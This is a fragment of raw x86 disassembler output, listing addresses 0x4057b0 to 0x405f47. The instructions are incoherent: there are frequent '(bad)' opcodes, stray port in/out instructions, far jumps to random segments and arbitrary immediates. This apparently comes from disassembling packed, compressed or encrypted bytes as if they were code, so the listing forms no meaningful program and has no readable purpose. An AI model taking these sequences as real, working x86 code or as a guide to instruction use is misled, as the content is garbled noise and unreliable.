  4057b0:	fmul   DWORD PTR [esi]
  4057b2:	push   edx
  4057b3:	scas   eax,DWORD PTR es:[edi]
  4057b4:	fistp  DWORD PTR [edi]
  4057b6:	hlt    
  4057b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057b8:	cs out dx,eax
  4057ba:	sub    esp,DWORD PTR [ecx-0x75]
  4057bd:	prefetchw (bad)
  4057be:	or     eax,0xef9dc4ce
  4057c3:	and    BYTE PTR [edx-0x66],al
  4057c6:	xchg   dx,ax
  4057c8:	ds loope 0x405800
  4057cb:	addr16 sti 
  4057cd:	mov    ch,0xd6
  4057cf:	(bad)  
  4057d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057d1:	xor    al,0xc8
  4057d3:	pop    ebp
  4057d4:	push   0x7
  4057d6:	inc    esp
  4057d7:	add    eax,DWORD PTR [esi-0x6abeb4a9]
  4057dd:	mov    BYTE PTR [eax+0x1da0a0d5],dh
  4057e3:	jae    0x405793
  4057e5:	xchg   DWORD PTR [edx+0x539c9959],esp
  4057eb:	ficom  WORD PTR [ebx+0x58e2bda2]
  4057f1:	das    
  4057f2:	or     DWORD PTR [ebx],ebx
  4057f4:	xchg   ebx,eax
  4057f5:	lds    edx,FWORD PTR [esi-0x48e2c15e]
  4057fb:	out    0x55,al
  4057fd:	imul   eax,DWORD PTR [esi-0x49],0x50
  405801:	adc    bh,ch
  405803:	add    BYTE PTR [ecx-0x7e36e608],bh
  405809:	and    BYTE PTR [eax-0x28],bl
  40580c:	lock (bad) 
  40580e:	out    0xfb,eax
  405810:	jmp    0x98d0:0x1d80c882
  405817:	xor    al,0x74
  405819:	in     eax,0x9f
  40581b:	inc    ebp
  40581c:	cmp    al,ch
  40581e:	mov    esi,0xe2e3c901
  405823:	loopne 0x405880
  405825:	loop   0x4057f1
  405827:	mov    dh,0x5
  405829:	jmp    0xe546425d
  40582e:	sub    cl,BYTE PTR [ecx+0x74]
  405831:	out    dx,al
  405832:	out    0x2f,al
  405834:	cmp    DWORD PTR [ebp+0x44],ebx
  405837:	sub    DWORD PTR [edx],0x2
  40583a:	adc    DWORD PTR [eax+0x1d20e364],0xa4eed412
  405844:	test   al,al
  405846:	dec    ebp
  405847:	je     0x40586b
  405849:	inc    eax
  40584a:	xchg   ebp,eax
  40584b:	adc    eax,0x34071296
  405850:	sub    BYTE PTR [ebp-0x39],dh
  405853:	scas   al,BYTE PTR es:[edi]
  405854:	stos   BYTE PTR es:[edi],al
  405855:	ins    BYTE PTR es:[edi],dx
  405856:	xchg   bl,ch
  405858:	ss out dx,eax
  40585a:	ins    DWORD PTR es:[edi],dx
  40585b:	shl    BYTE PTR [ecx],cl
  40585d:	mov    dl,0xc7
  40585f:	cwde   
  405860:	imul   esi,DWORD PTR [edi+0x2714b655],0x27d20852
  40586a:	pop    ebx
  40586b:	(bad)  
  40586c:	into   
  40586d:	test   al,0x5
  40586f:	call   0x5a275e77
  405874:	lods   al,BYTE PTR ds:[esi]
  405875:	mov    ch,0xe9
  405877:	jecxz  0x4058d9
  405879:	ins    BYTE PTR es:[edi],dx
  40587a:	lods   al,BYTE PTR ds:[esi]
  40587b:	sar    DWORD PTR [edx],0x4f
  40587e:	sahf   
  40587f:	jbe    0x405857
  405881:	jb     0x40581a
  405883:	jbe    0x40586c
  405885:	repz icebp 
  405887:	clc    
  405888:	sbb    DWORD PTR [eax],eax
  40588a:	mov    bh,0xf
  40588c:	out    dx,eax
  40588d:	and    bl,bl
  40588f:	sub    al,0xe6
  405891:	jecxz  0x405850
  405893:	test   eax,0xc31f3e5f
  405898:	jmp    0x4b4:0x8394942f
  40589f:	fcomp  QWORD PTR [edx-0x2a78363c]
  4058a5:	xchg   DWORD PTR [edi],ebx
  4058a7:	push   edx
  4058a8:	mov    eax,ds:0x657adf23
  4058ad:	jns    0x405854
  4058af:	dec    eax
  4058b0:	test   al,0x5a
  4058b2:	cwde   
  4058b3:	ins    BYTE PTR es:[edi],dx
  4058b4:	xchg   ebp,eax
  4058b5:	aas    
  4058b6:	sbb    BYTE PTR [eax-0x15abfe6c],bl
  4058bc:	sub    esp,DWORD PTR [ebx]
  4058be:	lahf   
  4058bf:	inc    ecx
  4058c0:	out    dx,al
  4058c1:	cmc    
  4058c2:	jns    0x405924
  4058c4:	ret    0xf2ab
  4058c7:	xor    DWORD PTR [eax+0x14],ebx
  4058ca:	inc    ebp
  4058cb:	clc    
  4058cc:	cdq    
  4058cd:	xchg   ebx,eax
  4058ce:	mov    bh,0xe0
  4058d0:	jo     0x40591c
  4058d2:	(bad)  
  4058d3:	pushf  
  4058d4:	int3   
  4058d5:	or     BYTE PTR [esi-0x9],bh
  4058d8:	lock adc BYTE PTR [ebp-0x24],cl
  4058dc:	mov    ecx,0x906b255d
  4058e1:	cmp    cl,cl
  4058e3:	add    al,0x81
  4058e5:	sub    eax,0xbd1d671a
  4058ea:	mov    ds:0xc67e44c6,eax
  4058ef:	dec    esp
  4058f0:	or     DWORD PTR [ebp+0x63],ebx
  4058f3:	jmp    0x40594a
  4058f5:	outs   dx,DWORD PTR ds:[esi]
  4058f6:	dec    ebx
  4058f7:	adc    cl,dl
  4058f9:	lds    edi,FWORD PTR [ebx-0x518b6897]
  4058ff:	inc    edi
  405900:	(bad)  
  405901:	std    
  405902:	das    
  405903:	ins    BYTE PTR es:[edi],dx
  405904:	aaa    
  405905:	add    dl,al
  405907:	cmp    BYTE PTR [ebp-0xc30f023],bh
  40590d:	daa    
  40590e:	fadd   DWORD PTR [esi]
  405910:	push   esp
  405911:	mov    WORD PTR [esi],fs
  405913:	push   ecx
  405914:	mov    ds:0xcf9ac94e,eax
  405919:	add    al,0xf4
  40591b:	ret    
  40591c:	xor    eax,0xae3e83cf
  405921:	add    ebp,ebx
  405923:	cmp    ah,cl
  405925:	je     0x405957
  405927:	test   DWORD PTR [ebp-0x1642c78],esi
  40592d:	retf   
  40592e:	fs cld 
  405930:	shl    DWORD PTR [ebp+edi*4-0x42],cl
  405934:	mov    ecx,0xf0cf742f
  405939:	xchg   edx,eax
  40593a:	icebp  
  40593b:	scas   eax,DWORD PTR es:[edi]
  40593c:	cwde   
  40593d:	in     eax,dx
  40593e:	arpl   bp,bx
  405940:	lock pop ecx
  405942:	mov    esp,0x4fd3c93
  405947:	call   0x72321af7
  40594c:	xor    dl,BYTE PTR [esi]
  40594e:	add    BYTE PTR [ebp+0x5686737c],al
  405954:	add    DWORD PTR [eax+eiz*4-0x56],esp
  405958:	ins    DWORD PTR es:[edi],dx
  405959:	ja     0x40593e
  40595b:	sti    
  40595c:	sub    DWORD PTR [ecx-0xb],ecx
  40595f:	adc    ebx,DWORD PTR [esi+eax*4+0x45]
  405963:	mov    dh,0x32
  405965:	and    DWORD PTR [ebp+0x5b907e7d],ecx
  40596b:	xchg   dh,dl
  40596d:	adc    ebp,eax
  40596f:	fwait
  405970:	cs and eax,0xd7bcc546
  405976:	pushfw 
  405978:	add    edi,DWORD PTR [edx]
  40597a:	sbb    ecx,DWORD PTR [esi]
  40597c:	mov    ebp,0x9533f9d2
  405981:	fidiv  DWORD PTR [ebx+eiz*4]
  405984:	inc    esp
  405985:	pop    ss
  405986:	lods   al,BYTE PTR ds:[esi]
  405987:	sub    BYTE PTR [edi],al
  405989:	call   DWORD PTR [eax]
  40598b:	mov    edi,0x19bbc7e0
  405990:	sbb    eax,0x5a8a741b
  405995:	mov    cl,0xd0
  405997:	pop    ds
  405998:	popa   
  405999:	dec    ebp
  40599a:	jne    0x405969
  40599c:	btr    edi,edx
  40599f:	repz mov eax,ds:0x1d2a990a
  4059a5:	jle    0x405a0e
  4059a7:	daa    
  4059a8:	xchg   edi,eax
  4059a9:	push   cs
  4059aa:	cmp    edx,DWORD PTR [edi]
  4059ac:	add    ebp,DWORD PTR [edx+0x2e]
  4059af:	inc    eax
  4059b0:	jle    0x40595b
  4059b2:	retf   
  4059b3:	mov    bh,0xd0
  4059b5:	test   esi,0x9cc14a5
  4059bb:	lods   al,BYTE PTR ds:[esi]
  4059bc:	push   0xffffff89
  4059be:	pop    es
  4059bf:	out    0x2c,eax
  4059c1:	das    
  4059c2:	and    bl,0x94
  4059c5:	faddp  st(5),st
  4059c7:	inc    eax
  4059c8:	fcom   DWORD PTR ds:0x1dca6367
  4059ce:	mov    bh,0x43
  4059d0:	jno    0x405996
  4059d2:	outs   dx,DWORD PTR ds:[esi]
  4059d3:	scas   eax,DWORD PTR es:[edi]
  4059d4:	stc    
  4059d5:	rol    DWORD PTR [esi+0x14],cl
  4059d8:	xchg   ebp,eax
  4059d9:	mov    ebp,0xdf00eef9
  4059de:	mov    esi,0x8a5fefae
  4059e3:	aam    0xf0
  4059e5:	or     DWORD PTR [eax],edi
  4059e7:	jecxz  0x4059cf
  4059e9:	outs   dx,DWORD PTR ds:[esi]
  4059ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059eb:	xchg   BYTE PTR [edx-0x4d8693bb],ah
  4059f1:	mov    BYTE PTR ds:0xc2365ec1,dl
  4059f7:	and    al,0x38
  4059f9:	lds    ebx,FWORD PTR [ebp+ebp*8-0x32]
  4059fd:	jmp    0x858b:0xf0d5959e
  405a04:	xchg   edi,eax
  405a05:	pop    edx
  405a06:	cmp    esi,DWORD PTR [ebx]
  405a08:	and    eax,0x89ec8e67
  405a0d:	stc    
  405a0e:	jae    0x405a23
  405a10:	dec    ecx
  405a11:	in     eax,0x3e
  405a13:	push   esi
  405a14:	add    eax,0x263a4b4d
  405a19:	sbb    eax,0x9753037f
  405a1e:	cdq    
  405a1f:	mov    al,BYTE PTR [eax]
  405a21:	cs inc ebp
  405a23:	xchg   esi,eax
  405a24:	fmul   QWORD PTR [ebx+edx*4+0x45]
  405a28:	iret   
  405a29:	mov    ecx,0xc96b3296
  405a2e:	adc    al,0xc7
  405a30:	mov    ecx,0xea145385
  405a35:	aaa    
  405a36:	cmp    DWORD PTR [edx],edi
  405a38:	and    esi,eax
  405a3a:	loope  0x4059de
  405a3c:	arpl   WORD PTR [edx-0x50],ax
  405a3f:	outs   dx,DWORD PTR ds:[esi]
  405a40:	rcr    DWORD PTR [edi+0x45],0xff
  405a44:	fstp   st(1)
  405a46:	scas   al,BYTE PTR es:[edi]
  405a47:	(bad)  
  405a48:	loopne 0x405aab
  405a4a:	not    DWORD PTR [edi-0x21]
  405a4d:	je     0x405a42
  405a4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a50:	dec    edx
  405a51:	mov    ss,WORD PTR [esi-0x222d45f8]
  405a57:	mov    ds:0x7299356c,al
  405a5c:	retf   0x1268
  405a5f:	xchg   edx,eax
  405a60:	cmc    
  405a61:	push   cs
  405a62:	jp     0x405a1c
  405a64:	adc    BYTE PTR fs:[bx+di],0xb1
  405a69:	add    DWORD PTR [eax],edx
  405a6b:	sbb    edx,DWORD PTR [eax]
  405a6d:	mov    edx,0x6222e7bd
  405a72:	mov    bl,0xc7
  405a74:	pop    ebx
  405a75:	popf   
  405a76:	jmp    0x97b44a5f
  405a7b:	out    dx,eax
  405a7c:	jp     0x405a06
  405a7e:	stc    
  405a7f:	mov    bh,0xcb
  405a81:	hlt    
  405a82:	outs   dx,DWORD PTR ds:[esi]
  405a83:	mov    WORD PTR [ebx+0x25b15cf1],es
  405a89:	xchg   esp,eax
  405a8a:	adc    DWORD PTR [edx+0x52],eax
  405a8d:	(bad)  
  405a8e:	dec    edi
  405a8f:	mov    eax,eax
  405a91:	idiv   DWORD PTR [ecx+0xf]
  405a94:	(bad)  
  405a95:	dec    esp
  405a96:	lds    ebp,FWORD PTR [ebx+edi*1]
  405a99:	dec    ebx
  405a9a:	out    0x5,eax
  405a9c:	retf   
  405a9d:	test   eax,0x9ae81611
  405aa2:	(bad)  
  405aa3:	in     eax,0xe0
  405aa5:	dec    esp
  405aa6:	adc    eax,DWORD PTR [esi+0x630a7092]
  405aac:	fild   QWORD PTR [eax+edx*1+0x14]
  405ab0:	add    BYTE PTR [edi-0x66],bl
  405ab3:	pop    ecx
  405ab4:	aas    
  405ab5:	jno    0x405ad6
  405ab7:	jecxz  0x405aa3
  405ab9:	adc    BYTE PTR [edx+0xd],ah
  405abc:	lahf   
  405abd:	add    bh,BYTE PTR [eax+0x24]
  405ac0:	daa    
  405ac1:	xor    eax,0x851d5cc2
  405ac6:	cmp    BYTE PTR [edx+ebx*1],al
  405ac9:	inc    ecx
  405aca:	(bad)  
  405acc:	xchg   esp,eax
  405acd:	ins    DWORD PTR es:[edi],dx
  405ace:	iret   
  405acf:	jg     0x405a5b
  405ad1:	clc    
  405ad2:	cli    
  405ad3:	test   al,0xff
  405ad5:	or     eax,0xbc4a74fb
  405ada:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405adb:	call   0x4e5c6c01
  405ae0:	and    eax,0x79b8447c
  405ae5:	rcr    edi,cl
  405ae7:	lock pop ecx
  405ae9:	xchg   dl,cl
  405aeb:	mov    ebx,0xe55aab4
  405af0:	inc    eax
  405af1:	je     0x405ac2
  405af3:	inc    esi
  405af4:	jmp    DWORD PTR [esi+0x73ee7a2a]
  405afa:	lds    ecx,FWORD PTR [ecx]
  405afc:	inc    ebx
  405afd:	ss test eax,0xc943784
  405b03:	(bad)  
  405b04:	popf   
  405b05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b06:	adc    bp,WORD PTR [ecx*4+0x1d667352]
  405b0e:	mov    eax,ds:0x101f5417
  405b13:	push   sp
  405b15:	rcr    BYTE PTR [eax+0x5ab1d66e],cl
  405b1b:	(bad)  
  405b1c:	xchg   esi,eax
  405b1d:	inc    ebx
  405b1e:	pop    esi
  405b1f:	js     0x405b91
  405b21:	in     al,dx
  405b22:	pop    es
  405b23:	scas   eax,DWORD PTR es:[edi]
  405b24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b25:	pusha  
  405b26:	outs   dx,DWORD PTR ds:[esi]
  405b27:	or     al,ah
  405b29:	pop    edi
  405b2a:	iret   
  405b2b:	arpl   WORD PTR [ebx+0x3a],dx
  405b2e:	test   DWORD PTR [ebx+esi*8+0x65a6b0bd],edx
  405b35:	inc    edi
  405b36:	cmp    eax,0xc0ea1ee7
  405b3b:	pop    ds
  405b3c:	add    BYTE PTR [edi+0x54039099],bh
  405b42:	(bad)  
  405b43:	jno    0x405b0d
  405b45:	adc    DWORD PTR [esi+0x33],ebx
  405b48:	gs push cs
  405b4a:	mov    DWORD PTR [edx],0x9e920530
  405b50:	and    edx,DWORD PTR [ebx]
  405b52:	adc    esp,eax
  405b54:	mov    dl,0xfd
  405b56:	fimul  DWORD PTR [ebx]
  405b58:	dec    esi
  405b59:	mov    ebx,0xa0d06c05
  405b5e:	or     ch,BYTE PTR [edi+0x1e4d6d14]
  405b64:	mov    esi,0x4e091c82
  405b69:	push   es
  405b6a:	sub    bl,ah
  405b6c:	dec    ecx
  405b6d:	sbb    al,0x85
  405b6f:	xchg   BYTE PTR [edi-0x4ced2804],cl
  405b75:	push   eax
  405b76:	adc    eax,0x113de2c7
  405b7b:	repnz fcmovb st,st(7)
  405b7e:	cmp    ecx,esp
  405b80:	ror    DWORD PTR [ebx],cl
  405b82:	jle    0x405be9
  405b84:	ja     0x405bb7
  405b86:	shl    BYTE PTR ss:[edx+0x1a],0x77
  405b8b:	std    
  405b8c:	ret    0xc1ce
  405b8f:	pop    esi
  405b90:	fsubr  DWORD PTR [edi]
  405b92:	aam    0xc
  405b94:	pop    ebp
  405b95:	mov    esi,0xbf36b6fb
  405b9a:	push   0xf38b48ef
  405b9f:	or     DWORD PTR [ebx],ebp
  405ba1:	xor    DWORD PTR [ebp-0x28],edx
  405ba4:	scas   al,BYTE PTR es:[edi]
  405ba5:	and    al,dl
  405ba7:	in     eax,0x46
  405ba9:	mov    bl,0x36
  405bab:	dec    edi
  405bac:	xor    edx,eax
  405bae:	sub    al,0x15
  405bb0:	mov    ebp,0x74b0894d
  405bb5:	mov    ebx,ss
  405bb7:	fxch   st(4)
  405bb9:	cld    
  405bba:	jg     0x405c1b
  405bbc:	(bad)  [ebx+0x1a]
  405bbf:	mul    BYTE PTR [edx+eiz*1+0x35]
  405bc3:	sub    BYTE PTR [esi],bl
  405bc5:	adc    BYTE PTR [esi+0x4d],cl
  405bc8:	xchg   edx,eax
  405bc9:	pop    esp
  405bca:	pop    es
  405bcb:	popf   
  405bcc:	mov    dh,0x9
  405bce:	jae    0x405bd2
  405bd0:	mov    eax,0x8c7f5823
  405bd5:	dec    edx
  405bd6:	inc    esp
  405bd7:	pushf  
  405bd8:	jmp    0x71b6:0x70115de8
  405bdf:	cmp    bl,BYTE PTR [esi+0x53f1e02a]
  405be5:	fwait
  405be6:	rcr    BYTE PTR [esp+ecx*4-0x7ab02abd],1
  405bed:	adc    al,0x75
  405bef:	jp     0x405bf3
  405bf1:	out    0xf8,eax
  405bf3:	loope  0x405c73
  405bf5:	das    
  405bf6:	enter  0x8ffe,0xb0
  405bfa:	inc    ecx
  405bfb:	and    eax,0xfd777d02
  405c00:	push   esp
  405c01:	ss push edi
  405c03:	push   edi
  405c04:	call   0xd955:0xbd0fb305
  405c0b:	or     BYTE PTR [esi],bl
  405c0d:	cld    
  405c0e:	add    DWORD PTR [eax+0x5b273baf],esp
  405c14:	add    ecx,DWORD PTR [ebp+0x2d]
  405c17:	inc    edx
  405c18:	stos   DWORD PTR es:[edi],eax
  405c19:	cld    
  405c1a:	adc    cl,ch
  405c1c:	ret    0x8ddf
  405c1f:	shl    DWORD PTR [ecx],cl
  405c21:	int    0x90
  405c23:	ror    esp,0x66
  405c26:	mov    edi,0x273864f8
  405c2b:	add    bl,dl
  405c2d:	sub    al,0xd8
  405c2f:	fdivr  st,st(0)
  405c31:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  405c33:	in     eax,dx
  405c34:	pusha  
  405c35:	mov    DWORD PTR [ecx],ecx
  405c37:	or     al,BYTE PTR [edx]
  405c39:	in     al,0xb1
  405c3b:	inc    eax
  405c3c:	enter  0x8d66,0xbb
  405c40:	or     ecx,DWORD PTR ss:[eax]
  405c43:	cs push ds
  405c45:	jl     0x405bde
  405c47:	mov    ecx,0x95001052
  405c4c:	pop    ss
  405c4d:	or     cl,BYTE PTR [ecx+0x1]
  405c50:	aaa    
  405c51:	jbe    0x405c70
  405c53:	xchg   esi,eax
  405c54:	ret    0xcbb5
  405c57:	test   DWORD PTR [ebx+0x17fb44aa],esp
  405c5d:	(bad)  
  405c5e:	fwait
  405c5f:	pop    edx
  405c60:	cmp    al,0xd4
  405c62:	inc    edi
  405c63:	iret   
  405c64:	sar    BYTE PTR [esi+0x379a5157],1
  405c6a:	dec    edx
  405c6b:	xor    esi,DWORD PTR ds:0x87131835
  405c71:	enter  0xe41a,0x8e
  405c75:	outs   dx,BYTE PTR ds:[esi]
  405c76:	add    DWORD PTR [edx+0x434111c9],0xffffffce
  405c7d:	xchg   cl,ah
  405c7f:	xlat   BYTE PTR ds:[ebx]
  405c80:	les    edi,FWORD PTR [ecx]
  405c82:	push   ss
  405c83:	pop    ebx
  405c84:	outs   dx,BYTE PTR ds:[esi]
  405c85:	out    0x9c,eax
  405c87:	add    BYTE PTR [eax-0x4e43b818],cl
  405c8d:	xchg   BYTE PTR [edi-0x4798786b],ch
  405c93:	mov    WORD PTR [esi+0x51],ds
  405c96:	jns    0x405c73
  405c98:	sub    DWORD PTR [ebp-0x2d83ace2],edx
  405c9e:	add    ch,BYTE PTR [ecx+esi*8+0x50709546]
  405ca5:	sub    al,0x54
  405ca7:	sub    al,0x8a
  405ca9:	dec    eax
  405caa:	add    DWORD PTR [ecx],eax
  405cac:	out    0x14,eax
  405cae:	rol    BYTE PTR fs:[edi-0x4ea46755],cl
  405cb5:	xor    DWORD PTR [esi+0x1e],0x873bd66b
  405cbc:	nop
  405cbd:	cmp    eax,0xb3fb303b
  405cc2:	outs   dx,BYTE PTR ds:[esi]
  405cc3:	xchg   edx,eax
  405cc4:	lea    ebp,[ebx+0x60]
  405cc7:	mov    ecx,DWORD PTR [edi]
  405cc9:	pop    es
  405cca:	out    0xb,eax
  405ccc:	bound  ebp,QWORD PTR [edx+0x35]
  405ccf:	out    0x8c,al
  405cd1:	push   ss
  405cd2:	mov    edi,0xb3b0e470
  405cd7:	mov    ebp,DWORD PTR [edi-0x66]
  405cda:	mov    ebx,DWORD PTR [edx+ebx*2-0x3298749a]
  405ce1:	or     dh,BYTE PTR [edi]
  405ce3:	aas    
  405ce4:	(bad)  
  405ce5:	(bad)
  405ce9:	jnp    0x405cf4
  405ceb:	jbe    0x405d49
  405ced:	sbb    DWORD PTR [esp+eax*2],esp
  405cf0:	lods   eax,DWORD PTR ds:[esi]
  405cf1:	inc    eax
  405cf2:	test   BYTE PTR ss:[esi],dh
  405cf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cf6:	dec    edx
  405cf7:	inc    ebx
  405cf8:	push   0xb7582911
  405cfd:	lods   al,BYTE PTR ds:[esi]
  405cfe:	sbb    BYTE PTR [eax-0x73b619c2],bl
  405d04:	inc    esi
  405d05:	jno    0x405d32
  405d07:	lahf   
  405d08:	mov    DWORD PTR [esi+0x352f7b03],edi
  405d0e:	jge    0x405cf7
  405d10:	mov    ecx,0xe4ff2237
  405d15:	out    0x44,eax
  405d17:	inc    esp
  405d18:	xor    al,0x6
  405d1a:	mov    eax,ds:0x7fa23b60
  405d1f:	xor    eax,0x8b6ed73c
  405d24:	mov    WORD PTR [esi+0x70],es
  405d27:	cdq    
  405d28:	ret    0xf4e6
  405d2b:	or     DWORD PTR [edi+esi*4+0x22],eax
  405d2f:	jae    0x405cba
  405d31:	xchg   cl,al
  405d33:	pop    ebx
  405d34:	cmp    DWORD PTR [eax],edx
  405d36:	cmp    edi,DWORD PTR [ebx+0x3d]
  405d39:	dec    DWORD PTR [ebp+0x46cfe2e2]
  405d3f:	push   esp
  405d40:	rol    BYTE PTR [esp+edx*1+0x4036df5a],1
  405d47:	test   eax,0x84d2bd70
  405d4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d4d:	scas   eax,DWORD PTR es:[edi]
  405d4e:	or     esp,DWORD PTR [ecx+0x1f]
  405d51:	dec    esi
  405d52:	mov    edx,0xcc33da60
  405d57:	mov    bl,0x41
  405d59:	fmul   DWORD PTR [edx-0x36cab4b0]
  405d5f:	jle    0x405d58
  405d61:	xchg   ebx,eax
  405d62:	jns    0x405d01
  405d64:	xchg   edi,eax
  405d65:	jne    0x405d84
  405d67:	cmp    ebp,DWORD PTR [edi+0x4bfd7873]
  405d6d:	(bad)  
  405d6f:	dec    esi
  405d70:	push   fs
  405d72:	xchg   edx,eax
  405d73:	sbb    esp,ecx
  405d75:	jnp    0x405dcd
  405d77:	hlt    
  405d78:	add    BYTE PTR [esi+0x28],al
  405d7b:	and    eax,0x865eded1
  405d80:	out    dx,al
  405d81:	out    dx,eax
  405d82:	cld    
  405d83:	fdivr  st(6),st
  405d86:	adc    BYTE PTR [edi-0x51],dl
  405d89:	and    eax,0x758a9dec
  405d8e:	pop    ecx
  405d8f:	jb     0x405e04
  405d91:	retf   0x26b0
  405d94:	pop    es
  405d95:	je     0x405dd0
  405d97:	(bad)  
  405d98:	mov    cl,dl
  405d9a:	call   0xb8b2:0x3636e224
  405da1:	(bad)  
  405da2:	xlat   BYTE PTR ds:[ebx]
  405da3:	rcl    DWORD PTR [eax+0x78],0x27
  405da7:	mov    edx,0x7631371e
  405dac:	mov    ds:0x10273106,al
  405db1:	mov    ebp,0x19b7e8b9
  405db6:	jb     0x405e30
  405db8:	add    edi,edi
  405dba:	inc    esi
  405dbb:	(bad)  
  405dbc:	push   eax
  405dbd:	test   bl,0xce
  405dc0:	das    
  405dc1:	and    eax,0x4bdf8578
  405dc6:	sub    dh,0x54
  405dc9:	push   ebx
  405dca:	adc    ch,dh
  405dcc:	mov    edi,0xb48fa3ef
  405dd1:	add    dl,al
  405dd3:	mov    cl,ah
  405dd5:	mov    ecx,DWORD PTR [ecx]
  405dd7:	pop    esi
  405dd8:	gs scas eax,DWORD PTR es:[edi]
  405dda:	mov    eax,ds:0xd820d70d
  405ddf:	enter  0x2cd8,0x64
  405de3:	dec    eax
  405de4:	bound  ecx,QWORD PTR [esi]
  405de6:	mov    bl,0x54
  405de8:	in     eax,dx
  405de9:	mov    ebx,0xc8532b0c
  405dee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405def:	add    edi,ecx
  405df1:	cwde   
  405df2:	xor    edx,DWORD PTR [ebx*8-0x3c3545fb]
  405df9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dfa:	xor    DWORD PTR [eax+0x63543a63],edi
  405e00:	lds    ebp,FWORD PTR [ecx+0x3d]
  405e03:	ds add dh,cl
  405e06:	in     eax,0xd6
  405e08:	push   esp
  405e09:	adc    al,0x25
  405e0b:	inc    eax
  405e0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e0d:	jnp    0x405d9b
  405e0f:	sub    BYTE PTR [edx],0x8a
  405e12:	adc    eax,0xf5d5d4e0
  405e17:	inc    esi
  405e18:	ds or  al,0x3b
  405e1b:	dec    edx
  405e1c:	pushf  
  405e1d:	ja     0x405dbe
  405e1f:	pop    esp
  405e20:	loop   0x405e51
  405e22:	sub    al,0x5c
  405e24:	xlat   BYTE PTR ds:[ebx]
  405e25:	mov    cs,WORD PTR [edx]
  405e27:	pushf  
  405e28:	fld    QWORD PTR [ebx]
  405e2a:	mov    ds:0xc7929029,eax
  405e2f:	or     ah,BYTE PTR [esi+0x66]
  405e32:	loope  0x405ddb
  405e34:	shl    ebx,cl
  405e36:	fisubr DWORD PTR [edx+eiz*4-0x23d65b2b]
  405e3d:	in     al,0x86
  405e3f:	test   BYTE PTR [esi],ch
  405e41:	or     cl,0xcd
  405e44:	test   eax,0x56676bf4
  405e49:	push   ebp
  405e4a:	rol    DWORD PTR [esi+esi*4+0x5543911e],1
  405e51:	cmc    
  405e52:	mov    eax,ds:0xa5c1fb77
  405e57:	test   edx,0x383b2fc7
  405e5d:	pop    ds
  405e5e:	pop    ebp
  405e5f:	stos   BYTE PTR es:[edi],al
  405e60:	retf   
  405e61:	ret    0x45d7
  405e64:	mov    edx,0xbd63f35b
  405e69:	mov    esi,0x7b8fdc5
  405e6e:	cwde   
  405e6f:	mov    WORD PTR [ebx+esi*4-0x5870090c],?
  405e76:	mov    ch,0x79
  405e78:	scas   eax,DWORD PTR es:[edi]
  405e79:	fidiv  WORD PTR [ebx+edx*4-0x2300959b]
  405e80:	cmp    esi,ebx
  405e82:	jno    0x405e08
  405e84:	in     al,dx
  405e85:	fisub  DWORD PTR [esi+0x1747df3c]
  405e8b:	retf   0x1ba0
  405e8e:	cmp    DWORD PTR [edi+0x6a91de18],ebx
  405e94:	xchg   esi,eax
  405e95:	movsx  esp,bx
  405e98:	push   ds
  405e99:	ins    DWORD PTR es:[edi],dx
  405e9a:	sbb    DWORD PTR [edi+0x6d],0xffffff93
  405e9e:	pop    eax
  405e9f:	test   DWORD PTR cs:[edi],ebx
  405ea2:	test   eax,0xebf4dd0e
  405ea7:	xchg   edi,eax
  405ea8:	mov    esi,0xc02b74d0
  405ead:	xchg   ebx,eax
  405eae:	(bad)  
  405eb0:	addr16 or eax,0xf4773fa8
  405eb6:	cmc    
  405eb7:	sub    al,0x86
  405eb9:	cmp    ebx,0xcad23a4f
  405ebf:	repnz add BYTE PTR [ebp-0x1a],bl
  405ec3:	in     eax,0x85
  405ec5:	sti    
  405ec6:	mov    eax,ds:0xfb4a1146
  405ecb:	fsub   QWORD PTR [eax]
  405ecd:	aas    
  405ece:	test   edi,eax
  405ed0:	stos   BYTE PTR es:[edi],al
  405ed1:	pop    esi
  405ed2:	adc    DWORD PTR [ecx],ebp
  405ed4:	fnstenv [eax+ebx*2]
  405ed7:	xor    al,0xa0
  405ed9:	mov    edi,0x4ee1da95
  405ede:	push   0x52c5c29f
  405ee3:	add    al,BYTE PTR [edx-0x7e]
  405ee6:	int    0xf
  405ee8:	aam    0x88
  405eea:	mov    edi,0xfab185be
  405eef:	loopne 0x405ebe
  405ef1:	sub    edi,DWORD PTR [ecx-0x7c]
  405ef4:	sub    eax,0x1739e32b
  405ef9:	or     BYTE PTR [edx+0x65],bh
  405efc:	mov    ds:0x97507d17,al
  405f01:	cmp    al,0xa1
  405f03:	addr16 aad 0xb5
  405f06:	popf   
  405f07:	out    0x36,eax
  405f09:	and    DWORD PTR [edi+eax*4-0x6015686c],esi
  405f10:	sbb    esi,ebx
  405f12:	mov    edx,DWORD PTR [eax]
  405f14:	les    ebx,FWORD PTR [esi-0x609e1d12]
  405f1a:	pop    edx
  405f1b:	scas   eax,DWORD PTR es:[edi]
  405f1c:	adc    DWORD PTR [edx+0x57],eax
  405f1f:	xchg   esp,eax
  405f20:	je     0x405eff
  405f22:	out    dx,eax
  405f23:	(bad)  
  405f24:	popf   
  405f25:	iret   
  405f26:	xor    al,0x55
  405f28:	pop    ecx
  405f29:	or     ah,BYTE PTR [ecx+0x48f09ce6]
  405f2f:	xor    BYTE PTR [ebx+ecx*1],ah
  405f32:	xchg   ebx,eax
  405f33:	mov    ecx,0x8aa234e7
  405f38:	(bad)  
  405f39:	xchg   edx,eax
  405f3a:	dec    esi
  405f3b:	out    0xd3,eax
  405f3d:	xlat   BYTE PTR ds:[ebx]
  405f3e:	outs   dx,BYTE PTR ds:[esi]
  405f3f:	pop    edx
  405f40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f41:	sahf   
  405f42:	cs in  eax,0xcd
  405f45:	hlt    
  405f46:	push   edi
  405f47:	jo     0x405f2f
